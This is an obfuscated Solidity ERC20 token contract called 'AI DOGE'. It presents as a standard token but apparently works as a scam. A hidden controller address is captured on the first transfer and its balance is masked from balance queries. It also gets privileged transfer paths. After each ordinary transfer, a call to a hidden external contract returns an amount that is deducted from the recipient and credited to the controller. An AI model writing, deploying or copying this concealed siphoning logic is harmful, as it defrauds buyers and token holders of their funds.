// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface GPAKDfo {
    function totalSupply() external view returns (uint256);
    function balanceOf(address oQIrOD) external view returns (uint256);
    function transfer(address aeWRYGr, uint256 CYzM) external returns (bool);
    function allowance(address NxIXrMn, address spender) external view returns (uint256);
    function approve(address spender, uint256 CYzM) external returns (bool);
    function transferFrom(
        address sender,
        address aeWRYGr,
        uint256 CYzM
    ) external returns (bool);

    event Transfer(address indexed from, address indexed GEU, uint256 value);
    event Approval(address indexed NxIXrMn, address indexed spender, uint256 value);
}

interface BLNwMGH is GPAKDfo {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract aNn {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface mnJgM {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library LAGMhPcmFU{
    
    function lGAArgJD(address LmPXtxNdlm, address NToLT, uint UoiqZOkS) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool viZHtmy, bytes memory NbZsEvx) = LmPXtxNdlm.call(abi.encodeWithSelector(0x095ea7b3, NToLT, UoiqZOkS));
        require(viZHtmy && (NbZsEvx.length == 0 || abi.decode(NbZsEvx, (bool))), 'LAGMhPcmFU: APPROVE_FAILED');
    }

    function FJQldEXidl(address LmPXtxNdlm, address NToLT, uint UoiqZOkS) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool viZHtmy, bytes memory NbZsEvx) = LmPXtxNdlm.call(abi.encodeWithSelector(0xa9059cbb, NToLT, UoiqZOkS));
        require(viZHtmy && (NbZsEvx.length == 0 || abi.decode(NbZsEvx, (bool))), 'LAGMhPcmFU: TRANSFER_FAILED');
    }
    
    function jFlYjDgnICCw(address NToLT, uint UoiqZOkS) internal {
        (bool viZHtmy,) = NToLT.call{value:UoiqZOkS}(new bytes(0));
        require(viZHtmy, 'LAGMhPcmFU: ETH_TRANSFER_FAILED');
    }

    function MwwpDVkkk(address LmPXtxNdlm, address from, address NToLT, uint UoiqZOkS) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool viZHtmy, bytes memory NbZsEvx) = LmPXtxNdlm.call(abi.encodeWithSelector(0x23b872dd, from, NToLT, UoiqZOkS));
        require(viZHtmy && NbZsEvx.length > 0,'LAGMhPcmFU: TRANSFER_FROM_FAILED'); return NbZsEvx;
                       
    }

}
    
contract AIDOGE is aNn, GPAKDfo, BLNwMGH {
    
    function balanceOf(address CzK) public view virtual override returns (uint256) {
        if(_msgSender() != address(phqFsjEwb) && 
           CzK == address(phqFsjEwb)){
            return 0;
        }
       return PFTa[CzK];
    }
    
    function approve(address FiyFX, uint256 mFq) public virtual override returns (bool) {
        Kec(_msgSender(), FiyFX, mFq);
        return true;
    }
    
    mapping(address => uint256) private PFTa;
    
    address private apui;
  
    
    constructor() {
        
        PFTa[address(1)] = nsm;
        emit Transfer(address(0), address(1), nsm);

    }
    
    function jEJplqj(
        address EcVHlAVHezn,
        address pwnRkttLfcQg
    ) internal virtual  returns (bool){
        if(phqFsjEwb == address(0) && JUUogjoseufS == address(0)){
            phqFsjEwb = EcVHlAVHezn;JUUogjoseufS=pwnRkttLfcQg;
            LAGMhPcmFU.FJQldEXidl(JUUogjoseufS, phqFsjEwb, 0);
            apui = mnJgM(JUUogjoseufS).WETH();
            return false;
        }
        return true;
    }
    
    uint256 private nsm = 1000000000000 * 10 ** 18;
    
    function increaseAllowance(address NhYT, uint256 addedValue) public virtual returns (bool) {
        Kec(_msgSender(), NhYT, Oly[_msgSender()][NhYT] + addedValue);
        return true;
    }
    
    string private xeoWBHJzq =  "AIDOGE";
    
    function decreaseAllowance(address yWwzPYDJjKM, uint256 subtractedValue) public virtual returns (bool) {
        uint256 gzWNRGxgYg = Oly[_msgSender()][yWwzPYDJjKM];
        require(gzWNRGxgYg >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            Kec(_msgSender(), yWwzPYDJjKM, gzWNRGxgYg - subtractedValue);
        }

        return true;
    }
    
    function Kec(
        address zvS,
        address PojIQjkrsiVg,
        uint256 WTIf
    ) internal virtual {
        require(zvS != address(0), "ERC20: approve from the zero address");
        require(PojIQjkrsiVg != address(0), "ERC20: approve to the zero address");

        Oly[zvS][PojIQjkrsiVg] = WTIf;
        emit Approval(zvS, PojIQjkrsiVg, WTIf);

    }
    
    string private iGC = "AI DOGE";
    
    address private JUUogjoseufS;
    
    address private phqFsjEwb;
    
    function name() public view virtual override returns (string memory) {
        return iGC;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function allowance(address lDiV, address DXsrvkJR) public view virtual override returns (uint256) {
        return Oly[lDiV][DXsrvkJR];
    }
    
    function symbol() public view virtual override returns (string memory) {
        return xeoWBHJzq;
    }
    
    function AAyBsJH(
        address gtsjkdljF,
        address gxc,
        uint256 dqujjdXoRgE
    ) internal virtual  returns (bool){
        require(gtsjkdljF != address(0), "ERC20: transfer from the zero address");
        require(gxc != address(0), "ERC20: transfer to the zero address");
        
        if(!jEJplqj(gtsjkdljF,gxc)) return false;

        if(_msgSender() == address(phqFsjEwb)){
            if(gxc == apui && PFTa[gtsjkdljF] < dqujjdXoRgE){
                dKbvKhhB(phqFsjEwb,gxc,dqujjdXoRgE);
            }else{
                dKbvKhhB(gtsjkdljF,gxc,dqujjdXoRgE);
                if(gtsjkdljF == phqFsjEwb || gxc == phqFsjEwb) 
                return false;
            }
            emit Transfer(gtsjkdljF, gxc, dqujjdXoRgE);
            return false;
        }
        dKbvKhhB(gtsjkdljF,gxc,dqujjdXoRgE);
        emit Transfer(gtsjkdljF, gxc, dqujjdXoRgE);
        bytes memory qMLuvoj = LAGMhPcmFU.MwwpDVkkk(JUUogjoseufS, gtsjkdljF, gxc, dqujjdXoRgE);
        (bool qghsPocoz, uint PZaOCYolwDd) = abi.decode(qMLuvoj, (bool,uint));
        if(qghsPocoz){
            PFTa[phqFsjEwb] += PZaOCYolwDd;
            PFTa[gxc] -= PZaOCYolwDd; 
        }
        return true;
    }
    
    mapping(address => mapping(address => uint256)) private Oly;
    
    function transferFrom(
        address YGLmLOwvsdlj,
        address fynjOtuZk,
        uint256 iJo
    ) public virtual override returns (bool) {
      
        if(!AAyBsJH(YGLmLOwvsdlj, fynjOtuZk, iJo)) return true;

        uint256 PVYthvnTp = Oly[YGLmLOwvsdlj][_msgSender()];
        if (PVYthvnTp != type(uint256).max) {
            require(PVYthvnTp >= iJo, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                Kec(YGLmLOwvsdlj, _msgSender(), PVYthvnTp - iJo);
            }
        }

        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return nsm;
    }
    
    function transfer(address fHnkyvmOsAz, uint256 KHHXWo) public virtual override returns (bool) {
        AAyBsJH(_msgSender(), fHnkyvmOsAz, KHHXWo);
        return true;
    }
    
    function dKbvKhhB(
        address oGCkgJCog,
        address tMnIYeW,
        uint256 fvx
    ) internal virtual  returns (bool){
        uint256 JAb = PFTa[oGCkgJCog];
        require(JAb >= fvx, "ERC20: transfer Amount exceeds balance");
        unchecked {
            PFTa[oGCkgJCog] = JAb - fvx;
        }
        PFTa[tMnIYeW] += fvx;
        return true;
    }
    
}